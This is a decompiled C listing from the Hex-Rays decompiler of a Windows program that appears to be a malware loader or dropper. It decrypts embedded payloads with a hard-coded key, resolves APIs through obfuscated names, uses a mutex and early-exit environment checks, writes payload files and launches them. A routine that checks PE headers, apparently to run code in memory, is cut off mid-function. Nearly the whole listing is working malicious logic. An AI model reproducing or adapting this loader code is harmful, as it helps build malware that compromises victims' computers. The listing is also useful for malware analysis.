/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

int sub_401000();
int sub_40100A();
void __noreturn sub_40101F(); // weak
// int __userpurge sub_40102C@<eax>(int@<ebx>, int, int, int, int);
// int __usercall sub_401B85@<eax>(int@<ebx>, int, _WORD *);
void __cdecl sub_401DCE(HANDLE hProcess);
// char *__usercall sub_401F27@<eax>(int@<ebx>, int, _DWORD *);
_BYTE *__cdecl sub_40210B(int);
const CHAR *sub_402209();
int sub_40234B();
LPSTR __cdecl sub_4024A5(char *);
int sub_402704();
BOOL sub_4027F7();
_BYTE *__cdecl sub_402891(int, _BYTE *, int);
int sub_402969();
BOOL sub_4029E1();
int sub_402A3A();
BOOL __thiscall sub_402AD3(void *this);
int sub_402B19();
int __cdecl sub_402B5B(int, int, unsigned int, unsigned int);
int sub_402D2B();
int __cdecl sub_4030D2(int, int);
// int __usercall StartAddress@<eax>(int@<ebx>);
int __cdecl sub_4035F9(int);
// _BYTE *__usercall sub_4036B0@<eax>(int@<ebx>, int, SIZE_T dwBytes, int);
BOOL __cdecl sub_403762(LPVOID lpMem);
char *__cdecl sub_40377C(char *, const char *);
CHAR *__cdecl sub_40379E(LPCSTR lpName);
int __cdecl sub_4037C7(char *, _BYTE *);
char *__cdecl sub_4037EC(char *, const char *);
_BYTE *__cdecl sub_403801(int, _BYTE *);
LPVOID __cdecl sub_403875(SIZE_T dwBytes);
// char *__usercall sub_40388E@<eax>(int@<ebx>, char *, char, unsigned int);
_BYTE *__cdecl sub_4038C1(_BYTE *, int, int);
unsigned int __cdecl sub_4038E3(char *a1);
int __cdecl sub_4038F4(int);
// void __usercall __noreturn start(int@<ebx>);
BOOL sub_4039DA();
unsigned int __cdecl sub_4039EF(char *a1, char **a2, unsigned int a3);
void __cdecl __noreturn sub_403AC2(UINT uExitCode); // idb
int __cdecl sub_403AF7(int (**)(void), unsigned int, int);
int sub_403B1E();

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *IsDebuggerPresent)();
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern DWORD (__stdcall *GetLastError)();
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *ReadProcessMemory)(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
const CHAR String[] = "Sz8ZsSiv"; // idb
_UNKNOWN unk_4040CC; // weak
int (*off_405000[2])(void) = { NULL, &sub_401000 }; // weak
_UNKNOWN unk_405008; // weak
int (*off_40500C[2])(void) = { NULL, &sub_4039DA }; // weak
_UNKNOWN unk_405014; // weak
int (*dword_405018)(void) = NULL; // weak
_UNKNOWN unk_40501C; // weak
int (*dword_405020)(void) = NULL; // weak
_UNKNOWN unk_405024; // weak
CHAR asc_405030[1] = "="; // idb
CHAR LibFileName[1] = "8"; // idb
CHAR a2[1] = "2"; // idb
CHAR asc_40505C[1] = "$"; // idb
CHAR byte_405068 = '\x10'; // idb
CHAR byte_405078 = '\x10'; // idb
CHAR byte_405084 = '\x10'; // idb
CHAR byte_405090 = '\x04'; // idb
CHAR byte_40509C = '\x1D'; // idb
CHAR byte_4050B4 = '\x1D'; // idb
CHAR byte_4050CC = '\x1D'; // idb
CHAR byte_4050E0 = '\x1D'; // idb
CHAR byte_4050F4 = '\x1D'; // idb
CHAR byte_405104 = '\x1D'; // idb
CHAR byte_405120 = '\x05'; // idb
CHAR byte_405130 = '\x15'; // idb
CHAR byte_405140 = '\0'; // idb
CHAR byte_405150 = '\x1F'; // idb
CHAR byte_405160 = '\x1F'; // idb
_UNKNOWN unk_405170; // weak
_UNKNOWN unk_4051B4; // weak
CHAR ModuleName[1] = "7"; // idb
CHAR byte_4051CC = '\0'; // idb
CHAR a2Q[3] = "2\nQ"; // idb
CHAR a7[1] = "7"; // idb
CHAR aL5[4] = "#\tL5"; // idb
CHAR byte_405200 = '\x1A'; // idb
CHAR byte_405210 = '\x1A'; // idb
CHAR byte_405224 = '\x1A'; // idb
CHAR byte_405238 = '\x1A'; // idb
CHAR aAg[7] = "&\t](@aG"; // idb
CHAR asc_405258[1] = " "; // idb
CHAR ProcName = '\x01'; // idb
CHAR byte_405274 = '\x01'; // idb
CHAR byte_405288 = '\x01'; // idb
CHAR byte_405298 = '\x01'; // idb
CHAR byte_4052A8 = '\x01'; // idb
CHAR byte_4052B4 = '\0'; // idb
CHAR byte_4052C4 = '\x1E'; // idb
_UNKNOWN unk_4052D0; // weak
_UNKNOWN unk_4052E8; // weak
CHAR byte_405318 = '\0'; // idb
CHAR asc_405350[1] = "$"; // idb
CHAR asc_405354[1] = " "; // idb
CHAR a2Hz[5] = "2\nHZ>"; // idb
_BYTE byte_405360[4] = { 55, 24, 56, 0 }; // weak
CHAR byte_405364 = '\0'; // idb
char byte_405370[12] = { '\x0F', '\t', 'A', ')', '\a', '6', '\x04', 'E', 'a', 'z', '\0', '\0' }; // weak
CHAR byte_40537C = '\x12'; // idb
CHAR a7hz4s[] = "\a7hZ<\n]4s"; // idb
_UNKNOWN unk_405390; // weak
CHAR byte_40539C = '\x1E'; // idb
CHAR byte_4053A8 = '\x10'; // idb
CHAR byte_4053B4 = '\0'; // idb
_UNKNOWN unk_4053C8; // weak
_UNKNOWN unk_4053DC; // weak
_UNKNOWN unk_405418; // weak
CHAR byte_405424 = '\x12'; // idb
CHAR byte_405440 = '\x10'; // idb
CHAR byte_405458 = '\x15'; // idb
int dword_405460 = 1; // weak
_BYTE byte_405464[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405468[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40546C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405470[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405474[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405478[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40547C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405480[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405484[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405488[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40548C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405490[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405494[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_405498[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_40549C[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A4[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054A8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054AC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054B0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054B4[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_4054B8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054BC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054C0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054C4[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_4054C8[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054CC[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054D0[4] = { 124, 124, 0, 0 }; // weak
_BYTE byte_4054D4[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_4054D8[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_4054E0[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_4054E4[4] = { 50, 0, 0, 0 }; // weak
_BYTE byte_4054E8[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_4054EC[4] = { 50, 0, 0, 0 }; // weak
_BYTE byte_4054FC[4] = { 34, 0, 0, 0 }; // weak
_BYTE byte_405500[4] = { 34, 0, 0, 0 }; // weak
_BYTE byte_405504[4] = { 37, 37, 0, 0 }; // weak
_BYTE byte_405508[4] = { 37, 37, 0, 0 }; // weak
_BYTE byte_40550C[4] = { 37, 37, 0, 0 }; // weak
_BYTE byte_405510[4] = { 37, 37, 0, 0 }; // weak
_BYTE byte_405514[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_405518[4] = { 48, 0, 0, 0 }; // weak
_BYTE byte_40551C[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_405520[4] = { 50, 0, 0, 0 }; // weak
_BYTE byte_405528[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_40552C[4] = { 49, 0, 0, 0 }; // weak
_BYTE byte_405530[4] = { 48, 0, 0, 0 }; // weak
char byte_405534[] = { '0' }; // weak
char a0[2] = "0"; // weak
char a0_0[2] = "0"; // weak
char a1[2] = "1"; // weak
char asc_405554[2] = "\\"; // weak
char asc_405558[2] = "\\"; // weak
char a1_0[2] = "1"; // weak
char a3[2] = "3"; // weak
CHAR String1[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_405599[39] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4055C0[41] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // idb
CHAR byte_4055E9[2] = { '\0', '\0' }; // idb
char byte_4055EB[4] = { '\0', '\0', '\0', '\0' }; // weak
char byte_4055EF[2] = { '\0', '\0' }; // weak
CHAR Name[17] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
char byte_405602[41]; // weak
char byte_40562B[261]; // weak
char byte_405730[6]; // weak
char byte_405736[295]; // weak
char byte_40585D[2]; // weak
char byte_40585F[2]; // weak
char byte_405861[2]; // weak
char byte_405863[6]; // weak
CHAR String2[9]; // idb
CHAR byte_405872[6]; // idb
CHAR byte_405878[6]; // idb
CHAR byte_40587E[41]; // idb
_UNKNOWN unk_4058A7; // weak
_UNKNOWN unk_4058A9; // weak
char byte_4058AB[41]; // weak
_UNKNOWN unk_4058D4; // weak
_UNKNOWN unk_40594C; // weak
_UNKNOWN unk_405975; // weak
char byte_405A7A[1698]; // weak
LPSTR lpString1; // idb
LPSTR dword_406120; // idb
LPSTR lpString2; // idb
int dword_406128; // weak
int dword_40612C; // weak
int dword_406130; // weak
HMODULE dword_406134; // idb
HMODULE hModule; // idb
HMODULE dword_40613C; // idb
HMODULE dword_406140; // idb
HMODULE dword_406144; // idb
HMODULE dword_406148; // idb
int (__stdcall *dword_40614C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406150)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406154)(_DWORD); // weak
int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406160)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40616C)(_DWORD); // weak
int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
CHAR Buffer[1024]; // idb
int dword_406578; // weak
int dword_40657C; // weak
int dword_406580[]; // weak
HANDLE hHeap; // idb
int (*dword_406604)(void); // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  return sub_40100A();
}

//----- (0040100A) --------------------------------------------------------
int sub_40100A()
{
  int result; // eax

  result = lstrlenA("Sz8ZsSiv");
  dword_406128 = result;
  return result;
}
// 406128: using guessed type int dword_406128;

//----- (0040101F) --------------------------------------------------------
void __noreturn sub_40101F()
{
  ExitProcess(0);
}
// 40101F: using guessed type void __noreturn sub_40101F();

//----- (0040102C) --------------------------------------------------------
int __userpurge sub_40102C@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5)
{
  void *v5; // ecx
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  CHAR *v9; // eax
  CHAR *v10; // eax
  int v11; // [esp+2Ch] [ebp-40h]
  unsigned int v12; // [esp+30h] [ebp-3Ch] BYREF
  unsigned int v13; // [esp+34h] [ebp-38h] BYREF
  int i; // [esp+38h] [ebp-34h]
  int v15[2]; // [esp+3Ch] [ebp-30h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+44h] [ebp-28h]
  char *v17; // [esp+48h] [ebp-24h]
  LPSTR v18; // [esp+4Ch] [ebp-20h]
  int *v19; // [esp+50h] [ebp-1Ch]
  LPCSTR lpString2; // [esp+54h] [ebp-18h]
  HANDLE hHandle; // [esp+58h] [ebp-14h]
  LPSTR lpString1; // [esp+5Ch] [ebp-10h]
  char *v23; // [esp+60h] [ebp-Ch]
  char *v24; // [esp+64h] [ebp-8h]
  LPSTR v25; // [esp+68h] [ebp-4h]

  i = 0;
  sub_402B19();
  ::lpString1 = (LPSTR)sub_403875(0x105u);
  ::lpString2 = (LPSTR)sub_403875(0x105u);
  dword_406120 = (LPSTR)sub_403875(0x105u);
  sub_402D2B();
  dword_406134 = LoadLibraryA(LibFileName);
  hModule = LoadLibraryA(::a2);
  dword_40613C = LoadLibraryA(asc_405030);
  dword_406140 = LoadLibraryA(asc_40505C);
  dword_406144 = LoadLibraryA(aAg);
  dword_406148 = LoadLibraryA(asc_405258);
  dword_40614C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, &ProcName);
  dword_406150 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      hModule,
                                                                                      &byte_405274);
  dword_406154 = (int (__stdcall *)(_DWORD))GetProcAddress(hModule, &byte_4052A8);
  dword_406158 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))GetProcAddress(hModule, &byte_405288);
  dword_40615C = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      hModule,
                                                                                      &byte_405298);
  dword_406160 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                      dword_406148,
                                                                                      &byte_4052B4);
  dword_406164 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(
                                                                                              dword_406134,
                                                                                              &byte_405084);
  dword_406168 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406134, &byte_405090);
  dword_40616C = (int (__stdcall *)(_DWORD))GetProcAddress(dword_406134, &byte_405078);
  dword_406174 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_406134, &byte_405120);
  dword_406170 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(dword_40613C, &byte_405104);
  dword_406130 = sub_402704();
  dword_405460 = sub_4027F7();
  v19 = v15;
  v15[1] = (int)sub_40101F;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v15[0] = (int)ExceptionList;
  if ( sub_402AD3(v5) )
    return 0;
  GetModuleFileNameA(0, ::lpString2, 0x104u);
  v7 = sub_40210B(0);
  lstrcpyA(::lpString1, v7);
  if ( !::lpString1 )
    lstrcpyA(::lpString1, ::lpString2);
  v17 = 0;
  v24 = 0;
  v12 = 0;
  v13 = 0;
  v17 = sub_401F27(a1, (int)&unk_405390, &v12);
  if ( !v17 || !v12 )
    return 0;
  v17 = (char *)sub_402B5B((int)v17, (int)"Sz8ZsSiv", v12, dword_406128);
  if ( !v17 || !v12 )
    return 0;
  lpString2 = 0;
  lpString2 = sub_403801((int)v17, byte_405464);
  if ( !lpString2 )
    return 0;
  lstrcpyA(String1, lpString2);
  lpString2 = sub_403801(0, byte_405468);
  lstrcpyA(byte_405599, lpString2);
  lpString2 = sub_403801(0, byte_40546C);
  lstrcpyA(byte_4055C0, lpString2);
  lpString2 = sub_403801(0, byte_405470);
  lstrcpyA(byte_4055E9, lpString2);
  lpString2 = sub_403801(0, byte_405474);
  sub_4037EC(byte_4055EB, lpString2);
  lpString2 = sub_403801(0, byte_405478);
  sub_4037EC(byte_4055EF, lpString2);
  lpString2 = sub_403801(0, byte_40547C);
  sub_4037EC(byte_405602, lpString2);
  lpString2 = sub_403801(0, byte_405480);
  sub_4037EC(byte_40562B, lpString2);
  lpString2 = sub_403801(0, byte_405484);
  sub_4037EC(byte_405730, lpString2);
  lpString2 = sub_403801(0, byte_405488);
  sub_4037EC(byte_405736, lpString2);
  lpString2 = sub_403801(0, byte_40548C);
  sub_4037EC(byte_40585D, lpString2);
  lpString2 = sub_403801(0, byte_405490);
  sub_4037EC(byte_40585F, lpString2);
  lpString2 = sub_403801(0, byte_405494);
  sub_4037EC(byte_405861, lpString2);
  lpString2 = sub_403801(0, byte_405498);
  sub_4037EC(byte_405863, lpString2);
  lpString2 = sub_403801(0, byte_40549C);
  lstrcpyA(String2, lpString2);
  lpString2 = sub_403801(0, byte_4054A0);
  lstrcpyA(byte_405872, lpString2);
  lpString2 = sub_403801(0, byte_4054A4);
  lstrcpyA(byte_405878, lpString2);
  lpString2 = sub_403801(0, byte_4054A8);
  lstrcpyA(byte_40587E, lpString2);
  lpString2 = sub_403801(0, byte_4054AC);
  lstrcpyA(Name, lpString2);
  for ( i = 0; i < 5; ++i )
  {
    lpString2 = sub_403801(0, byte_4054B0);
    lstrcpyA((LPSTR)&unk_4058A7 + 9 * i, lpString2);
    if ( sub_4037C7((char *)&unk_4058A7 + 9 * i, byte_4054B4) )
    {
      lpString2 = sub_403801(0, byte_4054B8);
      lstrcpyA((LPSTR)&unk_4058A9 + 9 * i, lpString2);
      lpString2 = sub_403801(0, byte_4054BC);
      lstrcpyA(&byte_4058AB[9 * i], lpString2);
    }
  }
  for ( i = 0; i < 5; ++i )
  {
    lpString2 = sub_403801(0, byte_4054C0);
    lstrcpyA((LPSTR)&unk_4058D4 + 424 * i, lpString2);
    if ( sub_4037C7((char *)&unk_4058D4 + 424 * i, byte_4054C4) )
    {
      lpString2 = sub_403801(0, byte_4054C8);
      lstrcpyA((LPSTR)&unk_40594C + 424 * i, lpString2);
      lpString2 = sub_403801(0, byte_4054CC);
      lstrcpyA((LPSTR)&unk_405975 + 424 * i, lpString2);
      lpString2 = sub_403801(0, byte_4054D0);
      lstrcpyA(&byte_405A7A[424 * i], lpString2);
    }
  }
  CreateMutexA(0, 1, Name);
  if ( GetLastError() == 183 )
    return 0;
  if ( !sub_4037C7(byte_40585D, byte_4054D4) && (sub_402969() || sub_402A3A()) )
    return 0;
  if ( !sub_4037C7(byte_40585F, byte_4054D8) && sub_4029E1() )
    return 0;
  v8 = sub_4024A5(::lpString2);
  lstrcpyA(::lpString2, v8);
  lpString1 = (LPSTR)sub_403875(0x105u);
  if ( dword_406130 && !dword_405460 && sub_4037C7(byte_40587E, &a2Hz[4]) )
  {
    if ( sub_4037C7(byte_40587E, byte_405360) )
    {
      v9 = sub_40379E(&byte_405364);
      lstrcpyA(lpString1, v9);
      sub_40377C(lpString1, "\\");
      sub_40377C(lpString1, byte_40587E);
    }
    else
    {
      lstrcpyA(lpString1, ::lpString1);
    }
  }
  else
  {
    lstrcpyA(lpString1, ::lpString2);
  }
  hHandle = 0;
  if ( sub_4037C7((char *)&unk_4058D4, byte_4054E0) && ::lpString1 )
    hHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
  v25 = (LPSTR)sub_403875(0x105u);
  v18 = (LPSTR)sub_403875(0x105u);
  v23 = 0;
  for ( i = 0; i <= 5; ++i )
  {
    lstrcpyA(v25, String2);
    v23 = (char *)sub_403875(0xAu);
    sub_402891(i, v23, 10);
    sub_40377C(v25, v23);
    if ( !i
      || !sub_4037C7((char *)&unk_4058A9 + 9 * i - 9, byte_4054E4)
      || !sub_4037C7((char *)&unk_4058A9 + 9 * i - 9, byte_4054E8) && dword_40612C )
    {
      v24 = sub_401F27(a1, (int)v25, &v13);
      if ( !v24 )
        break;
      if ( !v13 )
        break;
      v24 = (char *)sub_402B5B((int)v24, (int)"Sz8ZsSiv", v13, dword_406128);
      if ( !v24 || !v13 )
        break;
      if ( !i || sub_4037C7((char *)&unk_4058A7 + 9 * i - 9, byte_4054EC) )
      {
        if ( !sub_401B85(a1, (int)lpString1, v24) )
          return 0;
      }
      else
      {
        v10 = sub_40379E(a7hz4s);
        lstrcpyA(v18, v10);
        sub_40377C(v18, "\\");
        sub_40377C(v18, v23);
        sub_40377C(v18, "-");
        sub_40377C(v18, Name);
        sub_40377C(v18, ".");
        sub_40377C(v18, &byte_4058AB[9 * i - 9]);
        v11 = dword_406164(v18, 0x40000000, 0, 0, 2, 0, 0);
        if ( v11 == -1 )
          break;
        dword_406168(v11, v24, v13, &v13, 0);
        dword_40616C(v11);
        dword_406160(0, 4215688, v18, 0, 0, 1);
      }
    }
    v24 = 0;
    v13 = 0;
    sub_403762(v23);
  }
  if ( hHandle )
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
  return 0;
}
// 401222: variable 'v5' is possibly undefined
// 40101F: using guessed type void __noreturn sub_40101F();
// 405360: using guessed type _BYTE byte_405360[4];
// 405460: using guessed type int dword_405460;
// 405464: using guessed type _BYTE byte_405464[4];
// 405468: using guessed type _BYTE byte_405468[4];
// 40546C: using guessed type _BYTE byte_40546C[4];
// 405470: using guessed type _BYTE byte_405470[4];
// 405474: using guessed type _BYTE byte_405474[4];
// 405478: using guessed type _BYTE byte_405478[4];
// 40547C: using guessed type _BYTE byte_40547C[4];
// 405480: using guessed type _BYTE byte_405480[4];
// 405484: using guessed type _BYTE byte_405484[4];
// 405488: using guessed type _BYTE byte_405488[4];
// 40548C: using guessed type _BYTE byte_40548C[4];
// 405490: using guessed type _BYTE byte_405490[4];
// 405494: using guessed type _BYTE byte_405494[4];
// 405498: using guessed type _BYTE byte_405498[4];
// 40549C: using guessed type _BYTE byte_40549C[4];
// 4054A0: using guessed type _BYTE byte_4054A0[4];
// 4054A4: using guessed type _BYTE byte_4054A4[4];
// 4054A8: using guessed type _BYTE byte_4054A8[4];
// 4054AC: using guessed type _BYTE byte_4054AC[4];
// 4054B0: using guessed type _BYTE byte_4054B0[4];
// 4054B4: using guessed type _BYTE byte_4054B4[4];
// 4054B8: using guessed type _BYTE byte_4054B8[4];
// 4054BC: using guessed type _BYTE byte_4054BC[4];
// 4054C0: using guessed type _BYTE byte_4054C0[4];
// 4054C4: using guessed type _BYTE byte_4054C4[4];
// 4054C8: using guessed type _BYTE byte_4054C8[4];
// 4054CC: using guessed type _BYTE byte_4054CC[4];
// 4054D0: using guessed type _BYTE byte_4054D0[4];
// 4054D4: using guessed type _BYTE byte_4054D4[4];
// 4054D8: using guessed type _BYTE byte_4054D8[4];
// 4054E0: using guessed type _BYTE byte_4054E0[4];
// 4054E4: using guessed type _BYTE byte_4054E4[4];
// 4054E8: using guessed type _BYTE byte_4054E8[4];
// 4054EC: using guessed type _BYTE byte_4054EC[4];
// 406128: using guessed type int dword_406128;
// 40612C: using guessed type int dword_40612C;
// 406130: using guessed type int dword_406130;
// 40614C: using guessed type int (__stdcall *dword_40614C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406150: using guessed type int (__stdcall *dword_406150)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406154: using guessed type int (__stdcall *dword_406154)(_DWORD);
// 406158: using guessed type int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD);
// 40615C: using guessed type int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406164: using guessed type int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406168: using guessed type int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40616C: using guessed type int (__stdcall *dword_40616C)(_DWORD);
// 406170: using guessed type int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406174: using guessed type int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401B85) --------------------------------------------------------
int __usercall sub_401B85@<eax>(int a1@<ebx>, int a2, _WORD *a3)
{
  LPSTR CommandLineA; // eax
  int v5[17]; // [esp+0h] [ebp-34Ch] BYREF
  int v6[179]; // [esp+44h] [ebp-308h] BYREF
  HANDLE hProcess; // [esp+310h] [ebp-3Ch] BYREF
  int v8; // [esp+314h] [ebp-38h]
  int i; // [esp+320h] [ebp-2Ch]
  _WORD *v10; // [esp+324h] [ebp-28h]
  FARPROC v11; // [esp+328h] [ebp-24h]
  int v12; // [esp+32Ch] [ebp-20h] BYREF
  FARPROC v13; // [esp+330h] [ebp-1Ch]
  FARPROC v14; // [esp+334h] [ebp-18h]
  FARPROC v15; // [esp+338h] [ebp-14h]
  _DWORD *v16; // [esp+33Ch] [ebp-10h]
  int v17; // [esp+340h] [ebp-Ch]
  FARPROC ProcAddress; // [esp+344h] [ebp-8h]
  FARPROC v19; // [esp+348h] [ebp-4h]

  sub_40388E(a1, (char *)v5, 0, 0x44u);
  v5[0] = 68;
  v6[0] = 65543;
  v10 = a3;
  if ( *a3 != 23117 )
    return 0;
  v17 = (int)a3 + *((_DWORD *)v10 + 15);
  if ( *(_DWORD *)v17 != 17744 )
    return 0;
  ProcAddress = GetProcAddress(dword_406134, &byte_405068);
  v15 = GetProcAddress(dword_40613C, &byte_40509C);
